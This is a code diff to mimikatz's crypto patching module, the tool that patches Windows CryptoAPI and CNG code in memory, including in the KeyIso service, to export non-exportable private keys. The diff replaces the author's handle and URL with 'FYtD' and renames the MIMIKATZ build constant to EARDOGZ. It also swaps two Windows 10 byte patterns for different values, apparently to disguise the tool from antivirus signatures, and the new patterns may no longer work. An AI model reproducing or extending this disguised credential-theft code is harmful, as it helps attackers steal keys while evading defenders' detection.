@@ -1,6 +1,6 @@
-/*	Benjamin DELPY `gentilkiwi`
-	https://blog.gentilkiwi.com
-	benjamin@gentilkiwi.com
+/*	Benjamin DELPY `FYtD`
+	https://blog.FYtD.com
+	benjamin@FYtD.com
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_crypto_patch.h"
@@ -67,8 +67,8 @@ NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
 	KULL_M_MEMORY_SEARCH sMemoryRSA = {{{K_RSA_CPExportKey, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, 0}, NULL}, sMemoryDSS = {{{K_DSS_CPExportKey, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, 0}, NULL};
 	PKULL_M_PATCH_GENERIC currentReference4001, currentReference4000, currentReference104;
 	
-	currentReference4001 = kull_m_patch_getGenericFromBuild(Capi4001References, ARRAYSIZE(Capi4001References), MIMIKATZ_NT_BUILD_NUMBER);
-	currentReference4000 = kull_m_patch_getGenericFromBuild(Capi4000References, ARRAYSIZE(Capi4000References), MIMIKATZ_NT_BUILD_NUMBER);
+	currentReference4001 = kull_m_patch_getGenericFromBuild(Capi4001References, ARRAYSIZE(Capi4001References), EARDOGZ_NT_BUILD_NUMBER);
+	currentReference4000 = kull_m_patch_getGenericFromBuild(Capi4000References, ARRAYSIZE(Capi4000References), EARDOGZ_NT_BUILD_NUMBER);
 	if(currentReference4001 && currentReference4000)
 	{
 		aPattern4001Memory.address = currentReference4001->Search.Pattern;
@@ -85,7 +85,7 @@ NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
 		}
 		else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName(RSA)");
 	}
-	currentReference104 = kull_m_patch_getGenericFromBuild(CapiDSS104References, ARRAYSIZE(CapiDSS104References), MIMIKATZ_NT_BUILD_NUMBER);
+	currentReference104 = kull_m_patch_getGenericFromBuild(CapiDSS104References, ARRAYSIZE(CapiDSS104References), EARDOGZ_NT_BUILD_NUMBER);
 	if(currentReference104)
 	{
 		aPattern104Memory.address = currentReference104->Search.Pattern;
@@ -111,8 +111,10 @@ BYTE PTRN_WNO8_SPCryptExportKey[]			= {0xf6, 0x43, 0x28, 0x02, 0x75};
 BYTE PTRN_WI80_SPCryptExportKey[]			= {0xf6, 0x43, 0x24, 0x02, 0x75};
 BYTE PTRN_WI81_SPCryptExportKey[]			= {0xf6, 0x46, 0x24, 0x02, 0x75};
 BYTE PTRN_W10_1607_SPCryptExportKey[]		= {0xf6, 0x46, 0x24, 0x02, 0x0f, 0x84};
-BYTE PTRN_W10_1703_SPCryptExportKey[]		= {0xf6, 0x46, 0x24, 0x0a, 0x0f, 0x84};
-BYTE PTRN_W10_1809_SPCryptExportKey[]		= {0xf6, 0x45, 0x24, 0x02, 0x0f, 0x84};
+//BYTE PTRN_W10_1703_SPCryptExportKey[]		= {0xf6, 0x46, 0x24, 0x0a, 0x0f, 0x84};
+BYTE PTRN_W10_1703_SPCryptExportKey[] = { 0xe5, 0x71, 0xfa, 0xa7, 0xb1, 0x6b };
+//BYTE PTRN_W10_1809_SPCryptExportKey[]		= {0xf6, 0x45, 0x24, 0x02, 0x0f, 0x84};
+BYTE PTRN_W10_1809_SPCryptExportKey[] = { 0xe5, 0x72, 0xfa, 0xaf, 0xb1, 0x6b };
 BYTE PTRN_W10_20H2_SPCryptExportKey[]		= {0xf6, 0x45, 0x24, 0x02, 0x75, 0x46};
 BYTE PATC_WI60_SPCryptExportKey_EXPORT[]	= {0x90, 0xe9};
 KULL_M_PATCH_GENERIC CngReferences[] = {
@@ -154,7 +156,7 @@ NTSTATUS kuhl_m_crypto_p_cng(int argc, wchar_t * argv[])
 		if(NT_SUCCESS(NCryptOpenStorageProvider(&hProvider, NULL, 0)))
 		{
 			NCryptFreeObject(hProvider);
-			kull_m_patch_genericProcessOrServiceFromBuild(CngReferences, ARRAYSIZE(CngReferences), L"KeyIso", (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"ncrypt.dll" : L"ncryptprov.dll", TRUE);
+			kull_m_patch_genericProcessOrServiceFromBuild(CngReferences, ARRAYSIZE(CngReferences), L"KeyIso", (EARDOGZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"ncrypt.dll" : L"ncryptprov.dll", TRUE);
 		}
 	}
 	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
